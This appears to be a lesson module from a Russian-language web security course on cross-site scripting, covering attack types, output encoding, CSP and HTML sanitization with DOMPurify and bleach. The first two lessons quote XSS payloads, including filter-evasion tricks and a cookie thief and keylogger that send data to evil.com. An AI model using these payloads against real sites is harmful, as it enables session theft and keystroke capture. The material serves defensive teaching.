export default {
  id: 7,
  title: 'OWASP Top 10: XSS',
  description: 'Cross-Site Scripting: reflected, stored, DOM-based XSS. Content Security Policy, sanitization, encoding и современные методы защиты.',
  lessons: [
    {
      id: 1,
      title: 'Что такое XSS и типы атак',
      type: 'theory',
      content: [
        { type: 'text', value: 'XSS (Cross-Site Scripting) — внедрение вредоносного JavaScript в веб-страницу. Позволяет: кражу cookies/токенов, перенаправление пользователей, подмену контента, кейлоггинг. Три типа: Reflected, Stored, DOM-based.' },
        { type: 'heading', value: 'Типы XSS' },
        { type: 'list', value: [
          'Reflected XSS — вредоносный код в URL параметре, отражается в ответе сервера',
          'Stored XSS — код сохраняется в БД (комментарии, профили), выполняется у всех посетителей',
          'DOM-based XSS — код выполняется через манипуляции DOM на клиенте (без участия сервера)'
        ]},
        { type: 'code', language: 'javascript', value: '// === Reflected XSS ===\n// URL: https://example.com/search?q=<script>alert("XSS")</script>\n\n// Уязвимый серверный код:\napp.get("/search", (req, res) => {\n  const query = req.query.q;\n  // ОПАСНО: пользовательский ввод вставляется в HTML!\n  res.send(`<h1>Результаты поиска: ${query}</h1>`);\n});\n// Браузер выполнит <script>alert("XSS")</script>\n\n// === Stored XSS ===\n// Атакующий сохраняет в комментарий:\n// <script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>\n// Каждый, кто откроет страницу с комментарием, отправит свои cookies!\n\n// === DOM-based XSS ===\n// URL: https://example.com/page#<img src=x onerror=alert("XSS")>\n\n// Уязвимый клиентский код:\nconst hash = location.hash.substring(1);\ndocument.getElementById("output").innerHTML = hash;  // ОПАСНО!\n// innerHTML интерпретирует HTML, включая обработчики событий' },
        { type: 'warning', value: 'Stored XSS — самый опасный тип. Один вредоносный комментарий на популярном сайте может украсть cookies тысяч пользователей. В 2018 году Stored XSS в British Airways привёл к краже данных 380,000 карт.' }
      ]
    },
    {
      id: 2,
      title: 'XSS Payloads и обход фильтров',
      type: 'theory',
      content: [
        { type: 'text', value: 'Атакующие используют различные payload для обхода фильтров XSS. Понимание этих техник необходимо для построения надёжной защиты. Простые фильтры (замена <script>) легко обходятся.' },
        { type: 'heading', value: 'Примеры XSS payload (для защиты и тестирования)' },
        { type: 'code', language: 'javascript', value: '// Классические XSS payloads (для понимания защиты)\n\n// 1. Через тег script\n// <script>alert(1)</script>\n\n// 2. Через обработчики событий (обходит фильтр <script>)\n// <img src=x onerror=alert(1)>\n// <svg onload=alert(1)>\n// <body onload=alert(1)>\n// <input onfocus=alert(1) autofocus>\n\n// 3. Через href/src (javascript: протокол)\n// <a href="javascript:alert(1)">Click</a>\n// <iframe src="javascript:alert(1)">\n\n// 4. Кодирование для обхода фильтров\n// &#60;script&#62;alert(1)&#60;/script&#62;  (HTML entities)\n// \\x3cscript\\x3ealert(1)\\x3c/script\\x3e  (JS hex escape)\n// <scr<script>ipt>alert(1)</scr</script>ipt>  (вложенные теги)\n\n// 5. Реальная эксплуатация (кража cookies)\n// <script>\n// new Image().src = "https://evil.com/steal?c=" + document.cookie;\n// </script>\n\n// 6. Кейлоггер\n// <script>\n// document.onkeypress = (e) => {\n//   new Image().src = "https://evil.com/log?k=" + e.key;\n// };\n// </script>' },
        { type: 'text', value: 'Вот почему простая замена <script> не работает — существуют десятки способов выполнить JavaScript без тега script. Нужна комплексная защита: encoding, CSP, sanitization.' },
        { type: 'tip', value: 'Для тестирования XSS на собственных приложениях используйте XSS cheat sheet от PortSwigger и OWASP XSS Filter Evasion. Никогда не тестируйте на чужих сайтах!' }
      ]
    },
    {
      id: 3,
      title: 'Защита от XSS: Output Encoding',
      type: 'theory',
      content: [
        { type: 'text', value: 'Output Encoding — основной метод защиты от XSS. Специальные символы заменяются на безопасные HTML entities. Важно: кодирование зависит от контекста (HTML, JavaScript, URL, CSS).' },
        { type: 'heading', value: 'Контексты кодирования' },
        { type: 'code', language: 'javascript', value: '// === Кодирование в зависимости от контекста ===\n\n// 1. HTML контекст: <div>ДАННЫЕ</div>\nfunction htmlEncode(str) {\n  return str\n    .replace(/&/g, "&amp;")\n    .replace(/</g, "&lt;")\n    .replace(/>/g, "&gt;")\n    .replace(/"/g, "&quot;")\n    .replace(/\\x27/g, "&#x27;");\n}\n// "<script>" -> "&lt;script&gt;" — отображается как текст\n\n// 2. Атрибут HTML: <input value="ДАННЫЕ">\n// Используйте htmlEncode + ВСЕГДА оборачивайте в кавычки!\n// ОПАСНО: <input value=ДАННЫЕ>  (без кавычек!)\n// Payload: x onfocus=alert(1)\n\n// 3. JavaScript контекст: <script>var x = "ДАННЫЕ";</script>\nfunction jsEncode(str) {\n  return str.replace(/[\\\\"\\x27\\n\\r\\u2028\\u2029]/g, (c) => {\n    return "\\\\u" + ("0000" + c.charCodeAt(0).toString(16)).slice(-4);\n  });\n}\n\n// 4. URL контекст: <a href="/page?q=ДАННЫЕ">\n// Используйте encodeURIComponent()\nconst safeUrl = `/search?q=${encodeURIComponent(userInput)}`;\n\n// === React автоматически экранирует! ===\nfunction SafeComponent({ userInput }) {\n  // React экранирует по умолчанию:\n  return <div>{userInput}</div>; // Безопасно!\n  \n  // ОПАСНО: dangerouslySetInnerHTML\n  // return <div dangerouslySetInnerHTML={{__html: userInput}} />;\n}\n\n// === Vue.js автоматически экранирует! ===\n// <div>{{ userInput }}</div>  — безопасно (text interpolation)\n// <div v-html="userInput"></div>  — ОПАСНО!' },
        { type: 'warning', value: 'Современные фреймворки (React, Vue, Angular) экранируют по умолчанию. Но опасность остаётся при: dangerouslySetInnerHTML (React), v-html (Vue), bypassSecurityTrust (Angular), innerHTML (vanilla JS). Избегайте этих конструкций с пользовательскими данными!' }
      ]
    },
    {
      id: 4,
      title: 'Content Security Policy (CSP)',
      type: 'theory',
      content: [
        { type: 'text', value: 'CSP (Content Security Policy) — HTTP заголовок, ограничивающий источники загрузки ресурсов (скрипты, стили, изображения). Даже если XSS уязвимость существует, CSP может предотвратить выполнение вредоносного кода.' },
        { type: 'code', language: 'javascript', value: '// === CSP заголовок ===\n// Content-Security-Policy: директива1 значение1; директива2 значение2;\n\n// Строгий CSP (рекомендуется):\n// Content-Security-Policy:\n//   default-src \'self\';\n//   script-src \'self\' \'nonce-abc123\';\n//   style-src \'self\' \'nonce-abc123\';\n//   img-src \'self\' data: https:;\n//   font-src \'self\';\n//   connect-src \'self\' https://api.example.com;\n//   frame-ancestors \'none\';\n//   base-uri \'self\';\n//   form-action \'self\';\n\n// === Nonce-based CSP (лучшая практика) ===\n\n// Express.js middleware\nconst crypto = require("crypto");\n\napp.use((req, res, next) => {\n  // Генерация уникального nonce для каждого запроса\n  const nonce = crypto.randomBytes(16).toString("base64");\n  res.locals.nonce = nonce;\n  \n  res.setHeader("Content-Security-Policy", [\n    `default-src \'self\'`,\n    `script-src \'nonce-${nonce}\' \'strict-dynamic\'`,\n    `style-src \'nonce-${nonce}\'`,\n    `img-src \'self\' data: https:`,\n    `font-src \'self\'`,\n    `object-src \'none\'`,\n    `base-uri \'self\'`,\n    `frame-ancestors \'none\'`,\n  ].join("; "));\n  \n  next();\n});\n\n// В HTML используем nonce:\n// <script nonce="abc123">console.log("Разрешено");</script>\n// <script>alert("Заблокировано CSP!")</script>\n// ^^^ Этот скрипт НЕ выполнится — нет правильного nonce' },
        { type: 'heading', value: 'Основные директивы CSP' },
        { type: 'list', value: [
          'default-src — fallback для всех типов ресурсов',
          'script-src — источники JavaScript (nonce, hash, домен)',
          'style-src — источники CSS',
          'img-src — источники изображений',
          'connect-src — разрешённые API (fetch, WebSocket)',
          'frame-ancestors — кто может встроить в iframe (замена X-Frame-Options)',
          'report-uri / report-to — куда отправлять отчёты о нарушениях'
        ]},
        { type: 'tip', value: 'Начните с Content-Security-Policy-Report-Only для мониторинга без блокировки. Используйте nonce вместо unsafe-inline. strict-dynamic упрощает CSP для SPA приложений.' }
      ]
    },
    {
      id: 5,
      title: 'DOMPurify и HTML Sanitization',
      type: 'theory',
      content: [
        { type: 'text', value: 'Когда необходимо отображать пользовательский HTML (редакторы, markdown), используйте HTML sanitization. DOMPurify — рекомендуемая библиотека для безопасной очистки HTML от вредоносного кода.' },
        { type: 'code', language: 'javascript', value: '// === DOMPurify — безопасная очистка HTML ===\nimport DOMPurify from "dompurify";\n\n// Опасный HTML от пользователя\nconst dirtyHTML = `\n  <h1>Заголовок</h1>\n  <p>Нормальный текст</p>\n  <script>alert("XSS")</script>\n  <img src=x onerror="alert(\'XSS\')"/>\n  <a href="javascript:alert(\'XSS\')">Link</a>\n  <p onclick="alert(\'XSS\')">Кликни</p>\n`;\n\n// Очистка\nconst cleanHTML = DOMPurify.sanitize(dirtyHTML);\nconsole.log(cleanHTML);\n// <h1>Заголовок</h1>\n// <p>Нормальный текст</p>\n// <img src="x">\n// <a>Link</a>\n// <p>Кликни</p>\n// script, onerror, javascript:, onclick — удалены!\n\n// === Настройка DOMPurify ===\nconst strictClean = DOMPurify.sanitize(dirtyHTML, {\n  ALLOWED_TAGS: ["h1", "h2", "p", "b", "i", "a", "ul", "ol", "li", "code", "pre"],\n  ALLOWED_ATTR: ["href", "class"],\n  ALLOW_DATA_ATTR: false,\n});\n\n// === На сервере (Node.js) ===\nconst { JSDOM } = require("jsdom");\nconst createDOMPurify = require("dompurify");\nconst window = new JSDOM("").window;\nconst purify = createDOMPurify(window);\n\napp.post("/comment", (req, res) => {\n  const cleanContent = purify.sanitize(req.body.content, {\n    ALLOWED_TAGS: ["p", "b", "i", "a", "code"],\n    ALLOWED_ATTR: ["href"],\n  });\n  // Сохраняем очищенный HTML в БД\n  db.comments.insert({ content: cleanContent });\n});' },
        { type: 'code', language: 'python', value: '# Серверная sanitization в Python\nimport bleach\n\n# bleach — Python библиотека для очистки HTML\nuser_html = \'<script>alert("XSS")</script><p>Текст <b>жирный</b></p>\'\n\nclean = bleach.clean(\n    user_html,\n    tags=["p", "b", "i", "a", "code", "pre", "ul", "ol", "li"],\n    attributes={"a": ["href"]},\n    strip=True\n)\nprint(clean)  # <p>Текст <b>жирный</b></p>\n# script удалён!\n\n# Для Markdown: сначала конвертируйте Markdown -> HTML,\n# затем очистите HTML через bleach/DOMPurify\nimport markdown\nmd_text = "# Заголовок\\n**Жирный** и [ссылка](https://example.com)"\nhtml = markdown.markdown(md_text)\nclean_html = bleach.clean(html, tags=["h1","p","strong","a"], attributes={"a": ["href"]})' },
        { type: 'tip', value: 'Принцип многослойной защиты: 1) Output encoding по умолчанию (фреймворк), 2) DOMPurify для пользовательского HTML, 3) CSP как последний рубеж обороны. Все три слоя вместе делают XSS практически невозможным.' }
      ]
    },
    {
      id: 6,
      title: 'Практика: Защита от XSS',
      type: 'practice',
      difficulty: 'hard',
      description: 'Настройте комплексную защиту от XSS: output encoding, CSP с nonce, sanitization пользовательского HTML.',
      requirements: [
        'Найдите и исправьте Reflected XSS в обработчике поиска',
        'Найдите и исправьте Stored XSS в системе комментариев',
        'Настройте строгий CSP с nonce-based подходом',
        'Добавьте DOMPurify для пользовательского HTML контента',
        'Протестируйте защиту с помощью типичных XSS payload'
      ],
      hint: 'Замените innerHTML на textContent, добавьте CSP заголовок с nonce, используйте DOMPurify.sanitize() для HTML контента.',
      expectedOutput: 'Reflected XSS исправлен: encodeURIComponent + textContent\nStored XSS исправлен: DOMPurify.sanitize на выходе\nCSP: script-src nonce-{random}; frame-ancestors none\nТестирование: все XSS payload заблокированы\n<script>alert(1)</script> -> отображается как текст\n<img onerror=alert(1)> -> атрибут onerror удалён',
      solution: '// === Исправление Reflected XSS ===\n// БЫЛО:\n// app.get("/search", (req, res) => {\n//   res.send(`<h1>Результаты: ${req.query.q}</h1>`);\n// });\n\n// СТАЛО:\nconst escapeHtml = (str) => str\n  .replace(/&/g, "&amp;")\n  .replace(/</g, "&lt;")\n  .replace(/>/g, "&gt;")\n  .replace(/"/g, "&quot;")\n  .replace(/\\x27/g, "&#x27;");\n\napp.get("/search", (req, res) => {\n  const safeQuery = escapeHtml(req.query.q || "");\n  res.send(`<h1>Результаты: ${safeQuery}</h1>`);\n});\n\n// === Исправление Stored XSS ===\nconst createDOMPurify = require("dompurify");\nconst { JSDOM } = require("jsdom");\nconst purify = createDOMPurify(new JSDOM("").window);\n\napp.post("/comments", (req, res) => {\n  const clean = purify.sanitize(req.body.content, {\n    ALLOWED_TAGS: ["p", "b", "i", "a", "code"],\n    ALLOWED_ATTR: ["href"],\n  });\n  db.comments.insert({ content: clean, author: req.user.id });\n  res.json({ status: "ok" });\n});\n\n// === CSP middleware ===\nconst crypto = require("crypto");\napp.use((req, res, next) => {\n  const nonce = crypto.randomBytes(16).toString("base64");\n  res.locals.nonce = nonce;\n  res.setHeader("Content-Security-Policy", [\n    "default-src \'self\'",\n    `script-src \'nonce-${nonce}\' \'strict-dynamic\'`,\n    `style-src \'nonce-${nonce}\'`,\n    "img-src \'self\' data: https:",\n    "object-src \'none\'",\n    "base-uri \'self\'",\n    "frame-ancestors \'none\'",\n  ].join("; "));\n  next();\n});\n\n// === Тестирование ===\nconst payloads = [\n  \'<script>alert(1)</script>\',\n  \'<img src=x onerror=alert(1)>\',\n  \'<a href="javascript:alert(1)">X</a>\',\n  \'<svg onload=alert(1)>\',\n];\npayloads.forEach(p => {\n  const clean = purify.sanitize(p);\n  console.log(`${p} -> ${clean}`);\n});',
      explanation: 'Защита от XSS строится на трёх уровнях: 1) Output encoding — экранирование спецсимволов при выводе (основная защита), 2) HTML Sanitization — очистка пользовательского HTML библиотекой DOMPurify, 3) CSP — заголовок, блокирующий выполнение неавторизованных скриптов. Вместе они обеспечивают надёжную защиту от всех типов XSS.'
    }
  ]
}
